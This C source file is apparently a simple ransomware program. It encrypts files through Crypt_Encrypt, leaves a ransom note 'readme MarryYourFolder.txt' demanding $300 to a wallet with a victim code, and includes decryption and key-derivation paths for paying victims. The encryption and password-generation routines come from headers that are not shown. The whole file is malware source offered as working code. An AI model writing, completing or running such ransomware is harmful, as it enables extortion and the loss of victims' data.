#include <password_generator.h>
#include <crypt.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv)
{
	static const wchar_t *ignore[] = { L"readme MarryYourFolder.txt", NULL };
	char password[33] = { '\0' };

	if (argc > 1) {
		PasswordGenerator_GeneratePlainTextPassword(password, 32, argv[1], 8);
		printf("Password: %s\n", password);
		return 0;
	}

	FILE *txtFile = fopen("readme MarryYourFolder.txt", "r");
	if (txtFile != NULL) {
		size_t passwordRead = 0;
		char c = '\0';
		while (fread(&c, 1, 1, txtFile) == 1) {
			if (c == '\n') {
				memset(password, '\0', sizeof(password));
				passwordRead = 0;
				continue;
			}

			if (passwordRead < 32)
				password[passwordRead++] = c;
		}
		fclose(txtFile);
		Crypt_Decrypt(password, ignore);

		return 0;
	}

	char code[9] = { '\0' };
	PasswordGenerator_GenerateCode(code, 8);
	PasswordGenerator_GeneratePlainTextPassword(password, 32, code, 8);

	if (Crypt_Encrypt(password, ignore)) {
		txtFile = fopen("readme MarryYourFolder.txt", "w");
		fprintf(txtFile, "HAHA! LOSER! Your files got encrypted."
			"\nNow you pay me 300$ on DeepDarkFantasy wallet."
			"\n\nDon't forget to attach this code: %s."
			"\n[REPLACE THIS WITH A 32 CHARACTER PASSWORD]", code);
		fclose(txtFile);
	}

	return 0;
}
